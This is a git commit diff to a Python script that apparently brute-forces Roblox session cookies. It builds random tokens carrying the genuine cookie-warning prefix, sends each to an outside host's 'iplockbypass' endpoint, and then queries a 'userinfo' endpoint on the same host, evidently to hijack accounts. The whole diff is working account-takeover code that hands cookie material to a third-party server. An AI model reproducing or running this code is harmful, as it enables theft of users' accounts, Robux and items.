b9b76ed3dab04bcc1dae489bb4d5e7cdf7a1dc94
Mohammed8339 <49081161+Mohammed8339@users.noreply.github.com>
2022-07-26 00:07:06 -0400

    Update main.py

--- main.py
+++ main.py
@@ -8,8 +8,9 @@ def process():
    while True:
       valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
       rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
+      finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
 
-      cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={rancookie}").text
+      cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text
       r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
       data = r.json()
 
